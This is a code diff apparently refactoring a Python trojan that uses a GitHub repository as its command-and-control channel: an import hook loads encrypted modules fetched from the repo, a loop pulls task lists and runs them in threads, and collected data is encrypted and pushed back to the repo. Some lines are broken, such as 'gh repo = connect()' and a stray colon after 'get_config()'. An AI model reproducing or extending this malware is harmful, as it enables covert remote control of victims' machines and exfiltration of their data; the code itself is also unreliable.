@@ -3,29 +3,23 @@ import base64
 import sys
 import time
 import imp
-import random
 import threading
 import Queue
-import os
 import zlib
 import Config
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 from github3 import login
 
-configured = False
-config = Config()
-
 class ReImp(object):
 	def __init__(self):
 		self.code = ""
 
 	def find_module(self, fullname, path=None):
-		if configured:
-			lib = get_file(config.my_mod() + fullname)
-			if lib is not None:
-				self.code = decrypt(self.code)
-				return self
+		lib = get_file(config.my_mod() + fullname)
+		if lib is not None:
+			self.code = decrypt(self.code)
+			return self
 		return None
 
 	def load_module(self,name):
@@ -35,27 +29,18 @@ class ReImp(object):
 		return module
 
 def connect():
-	gh = login(username = config.my_usr(), password = config.my_pwd())
+	gh = login(token = config.my_token())
 	repo = gh.repository(config.my_usr(), config.my_repo())
-	branch = repo.branch(config.my_branch())
-	return gh, repo, branch
+	return gh, repo
 
-#change to get file directly instead of searching
-#may need to base64 decode blob before returning (if its stored that way)
 def get_file(path):
-	gh, repo, branch = connect()
-	tree = branch.commit.commit.tree.recurse()
-	for file in tree.tree:
-		if path in file.path:
-			blob = repo.blob(file._json_data['sha'])
-			return blob.content
-	return None
+	gh, repo = connect()
+	contents = repo.file_contents(path).decoded()
+	return contents
 
 def create_config():
-	global configured
-	gh repo, branch = connect()
+	gh repo = connect()
 	repo.create_file(config.my_config(), config.com_mess(), "")
-	configured = True
 	return
 
 def get_config():
@@ -70,11 +55,11 @@ def get_config():
 	return config_file
 
 def clear_config():
-	gh, repo, branch = connect_gh()
-	repo.contents(config.my_config()).update(config.my_com(), "")
+	gh, repo = connect()
+	repo.file_contents(config.my_config()).update(config.my_com(), "")
 
 def push_data(data):
-	gh, repo, branch = connect_gh()
+	gh, repo = connect()
 	repo.create_file(config.my_data(), config.com_mess(), encrypt(data))
 	return
 
@@ -118,16 +103,18 @@ def module_runner():
 		task = config.tasks.get()
 		t = threading.Thread(target=run_module, args = (task))
 		t.start()
-		time.sleep(task['sleep'])
+		if 'sleep' in task:
+			time.sleep(task['sleep'])
 	return
 
+config = Config()
 sys.meta_path = [ReImp()]
 create_config()
 while True:
 	if config.tasks.empty():
 		config_file = get_config():
 		if config_file == None:
-			time.sleep(1800)
+			time.sleep(config.my_sleep())
 			continue
 		for task in config_file:
 			config.tasks.add(task)
